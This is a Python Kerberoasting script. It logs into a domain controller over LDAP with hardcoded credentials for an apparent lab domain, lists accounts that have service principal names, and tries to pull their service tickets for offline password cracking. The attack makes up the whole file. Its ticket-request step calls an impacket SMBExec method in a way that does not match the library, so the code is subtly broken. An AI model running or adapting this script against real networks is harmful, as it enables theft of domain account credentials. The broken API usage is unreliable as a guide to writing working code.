from impacket.smbexec import SMBExec
from ldap3 import Server, Connection, SUBTREE

def find_and_kerberoast_objects(username, password, domain, dc_ip):
    try:
        # Connect to the Domain Controller via LDAP
        server = Server(dc_ip, port=389)
        conn = Connection(server, user=f"{domain}\\{username}", password=password, authentication='NTLM', auto_bind=True)

        # Search for objects with SPNs set
        search_base = 'DC=' + ',DC='.join(domain.split('.'))
        search_filter = '(servicePrincipalName=*)'
        attributes = ['sAMAccountName', 'servicePrincipalName']
        conn.search(search_base, search_filter, SUBTREE, attributes=attributes)

        # Parse search result and kerberoast objects
        for entry in conn.entries:
            sAMAccountName = entry['sAMAccountName'].value
            servicePrincipalNames = entry['servicePrincipalName'].values
            print(f"Kerberoasting {sAMAccountName}...")
            smbexec = SMBExec(dc_ip, domain=domain, username=username, password=password)
            tgs_tickets = smbexec.GetUserSPNs(sAMAccountName)
            if tgs_tickets:
                for tgs in tgs_tickets:
                    print(tgs)

        conn.unbind()

    except Exception as e:
        print(f"Error while searching for kerberoastable objects or Kerberoasting: {e}")

# Example usage:
# Replace "username", "password", "domain", and "dc_ip" with your actual credentials and domain controller's IP address
username = "ajman"
password = "DomainAdmin123!"
domain = "snaplabs.local"
dc_ip = "10.10.0.86"

find_and_kerberoast_objects(username, password, domain, dc_ip)
